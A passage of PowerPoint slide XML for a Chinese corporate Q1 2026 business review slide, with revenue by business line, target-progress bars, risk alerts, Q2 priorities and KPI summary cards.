            <a:ext cx="215788" cy="287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00" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="Text 97"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2463575" y="4346097"/>
            <a:ext cx="1078938" cy="287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13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数据分析平台</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="713" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="Text 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3632425" y="4346097"/>
            <a:ext cx="827186" cy="287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7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892万</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="Text 99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4531540" y="4346097"/>
            <a:ext cx="827186" cy="287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75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900万</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="Text 100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5430655" y="4346097"/>
            <a:ext cx="665345" cy="287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13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713" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="Text 101"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6149947" y="4346097"/>
            <a:ext cx="647363" cy="287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75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12.1%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Shape 102"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6905204" y="4418027"/>
            <a:ext cx="377628" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 19069"/>
            </a:avLst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6" name="Text 103"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6905204" y="4418027"/>
            <a:ext cx="377628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3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微差</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="107" name="Shape 104"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2265770" y="4687761"/>
            <a:ext cx="4936142" cy="359646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2265770" y="5038416"/>
            <a:ext cx="4936142" cy="8991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2265770" y="4723726"/>
            <a:ext cx="215788" cy="287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00" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="Text 107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2463575" y="4723726"/>
            <a:ext cx="1078938" cy="287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13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安全服务</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="713" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111" name="Text 108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3632425" y="4723726"/>
            <a:ext cx="827186" cy="287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7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792万</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="Text 109"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4531540" y="4723726"/>
            <a:ext cx="827186" cy="287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75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900万</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113" name="Text 110"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5430655" y="4723726"/>
            <a:ext cx="665345" cy="287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13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713" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Text 111"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6149947" y="4723726"/>
            <a:ext cx="647363" cy="287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75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3.2%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115" name="Shape 112"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6905204" y="4795655"/>
            <a:ext cx="377628" cy="143858"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 19069"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FEE2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6905204" y="4795655"/>
            <a:ext cx="377628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3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未达</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="117" name="Shape 114"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417699" y="983407"/>
            <a:ext cx="1600425" cy="170831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8" name="Text 115"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="1055336"/>
            <a:ext cx="1456566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75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年度目标进度（Q1末）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="119" name="Text 116"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="1235159"/>
            <a:ext cx="1456566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年营收目标 2亿</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="120" name="Shape 117"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="1343053"/>
            <a:ext cx="1456566" cy="62938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7489628" y="1343053"/>
            <a:ext cx="348119" cy="62938"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 145286"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006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2" name="Text 119"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8658478" y="1235159"/>
            <a:ext cx="323681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563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23.9%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="123" name="Text 120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="1504894"/>
            <a:ext cx="1456566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净利润目标 4000万</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="124" name="Shape 121"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="1612788"/>
            <a:ext cx="1456566" cy="62938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7489628" y="1612788"/>
            <a:ext cx="396186" cy="62938"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 145286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6" name="Text 123"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8658478" y="1504894"/>
            <a:ext cx="323681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563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27.2%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="127" name="Text 124"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="1774628"/>
            <a:ext cx="1456566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新客目标 8000家</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="128" name="Shape 125"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="1882522"/>
            <a:ext cx="1456566" cy="62938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7489628" y="1882522"/>
            <a:ext cx="426774" cy="62938"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 145286"/>
            </a:avLst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0" name="Text 127"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8658478" y="1774628"/>
            <a:ext cx="323681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563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29.3%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="131" name="Text 128"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="2044363"/>
            <a:ext cx="1456566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NPS目标 65分</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="132" name="Shape 129"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="2152257"/>
            <a:ext cx="1456566" cy="62938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7489628" y="2152257"/>
            <a:ext cx="1389564" cy="62938"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 145286"/>
            </a:avLst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4" name="Text 131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8658478" y="2044363"/>
            <a:ext cx="323681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563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95.4%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="135" name="Text 132"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="2314097"/>
            <a:ext cx="1456566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市场份额目标12%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="136" name="Shape 133"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="2421991"/>
            <a:ext cx="1456566" cy="62938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7489628" y="2421991"/>
            <a:ext cx="1092425" cy="62938"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 145286"/>
            </a:avLst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8" name="Text 135"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8658478" y="2314097"/>
            <a:ext cx="323681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563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563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="139" name="Shape 136"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417699" y="2763655"/>
            <a:ext cx="1600425" cy="14385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0" name="Text 137"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="2835584"/>
            <a:ext cx="1456566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75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风险预警 &amp; 关注项</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="141" name="Shape 138"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7507611" y="3051372"/>
            <a:ext cx="62938" cy="6293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2" name="Text 139"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7615504" y="3015407"/>
            <a:ext cx="1330690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安全服务线Q1差距 108万，需Q2加速追赶</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="143" name="Shape 140"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7507611" y="3339088"/>
            <a:ext cx="62938" cy="6293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4" name="Text 141"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7615504" y="3303124"/>
            <a:ext cx="1330690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研发团队缺口42人，影响Q2交付</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="145" name="Shape 142"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7507611" y="3626805"/>
            <a:ext cx="62938" cy="6293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6" name="Text 143"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7615504" y="3590841"/>
            <a:ext cx="1330690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竞品价格战压力，华南客单价下降8%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="147" name="Shape 144"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7507611" y="3914522"/>
            <a:ext cx="62938" cy="6293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8" name="Text 145"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7615504" y="3878558"/>
            <a:ext cx="1330690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AI业务超预期，需前置备货防产能瓶颈</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="149" name="Shape 146"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417699" y="4274168"/>
            <a:ext cx="1600425" cy="107893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0" name="Text 147"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="4346097"/>
            <a:ext cx="1456566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75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Q2 三大重点份务</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="151" name="Shape 148"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="4543903"/>
            <a:ext cx="1456566" cy="215788"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8FAF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7489628" y="4543903"/>
            <a:ext cx="26973" cy="215788"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006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3" name="Text 150"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7552566" y="4561885"/>
            <a:ext cx="1366655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38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 AI产品矩阵上线</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Text 151"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7552566" y="4669779"/>
            <a:ext cx="1366655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4月完成发布</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="155" name="Shape 152"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="4795655"/>
            <a:ext cx="1456566" cy="215788"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8FAFC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7489628" y="4795655"/>
            <a:ext cx="26973" cy="215788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7" name="Text 154"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7552566" y="4813637"/>
            <a:ext cx="1366655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38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👥 安全业务整合</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158" name="Text 155"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7552566" y="4921531"/>
            <a:ext cx="1366655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补齐Q1缺口</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159" name="Shape 156"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7489628" y="5047407"/>
            <a:ext cx="1456566" cy="215788"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8FAFC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7489628" y="5047407"/>
            <a:ext cx="26973" cy="215788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1" name="Text 158"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7552566" y="5065389"/>
            <a:ext cx="1366655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38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🌍 海外市场试点</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162" name="Text 159"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7552566" y="5173283"/>
            <a:ext cx="1366655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东南亚2国POC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163" name="Shape 160"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6054416"/>
            <a:ext cx="9144000" cy="431575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0" y="6054416"/>
            <a:ext cx="9144000" cy="8991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1645381" y="6090381"/>
            <a:ext cx="8991" cy="323681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3164885" y="6090381"/>
            <a:ext cx="8991" cy="323681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4747327" y="6090381"/>
            <a:ext cx="8991" cy="323681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6347752" y="6090381"/>
            <a:ext cx="8991" cy="323681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9" name="Text 166"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="6090381"/>
            <a:ext cx="197805" cy="323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75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💰</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="170" name="Text 167"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="359646" y="6090381"/>
            <a:ext cx="1393628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kern="0" spc="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季度营收</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="171" name="Text 168"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="359646" y="6198274"/>
            <a:ext cx="1393628" cy="1798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4,782万</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="172" name="Text 169"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1798230" y="6090381"/>
            <a:ext cx="197805" cy="323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75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975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="173" name="Text 170"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2014018" y="6090381"/>
            <a:ext cx="1393628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kern="0" spc="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净利润率</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="174" name="Text 171"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2014018" y="6198274"/>
            <a:ext cx="1393628" cy="1798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22.8%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="175" name="Text 172"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3326726" y="6090381"/>
            <a:ext cx="197805" cy="323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75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👥</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="176" name="Text 173"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3542513" y="6090381"/>
            <a:ext cx="1393628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kern="0" spc="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新增客户</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="177" name="Text 174"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3542513" y="6198274"/>
            <a:ext cx="1393628" cy="1798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2,341家</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="178" name="Text 175"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4927150" y="6090381"/>
            <a:ext cx="197805" cy="323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75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⭐</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="179" name="Text 176"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5142938" y="6090381"/>
            <a:ext cx="1393628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kern="0" spc="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NPS评分</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="180" name="Text 177"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5142938" y="6198274"/>
            <a:ext cx="1393628" cy="1798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62分</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="181" name="Text 178"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6473628" y="6090381"/>
            <a:ext cx="197805" cy="323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75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975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="182" name="Text 179"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6689416" y="6090381"/>
            <a:ext cx="1393628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kern="0" spc="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整体完成率</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="183" name="Text 180"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6689416" y="6198274"/>
            <a:ext cx="1393628" cy="1798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109%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="184" name="Shape 181"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7822301" y="6108363"/>
            <a:ext cx="1186832" cy="287717"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15891"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006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5" name="Text 182"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7822301" y="6108363"/>
            <a:ext cx="1186832" cy="287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查看详细附件</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="186" name="Shape 183"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6485991"/>
            <a:ext cx="9144000" cy="179823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0" y="6485991"/>
            <a:ext cx="9144000" cy="8991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8" name="Text 185"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="6512965"/>
            <a:ext cx="6293805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488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极光科技集团 · 2026 Q1经营业绩汇报 · 内部机密 · 未经授权请勿外传</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="189" name="Text 186"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6293805" y="6512965"/>
            <a:ext cx="2697345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488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 04 / 06 · 商务汇报风格 · 2026-03-13</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="48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991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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9292" y="0"/>
            <a:ext cx="8991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A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38584" y="0"/>
            <a:ext cx="8991" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
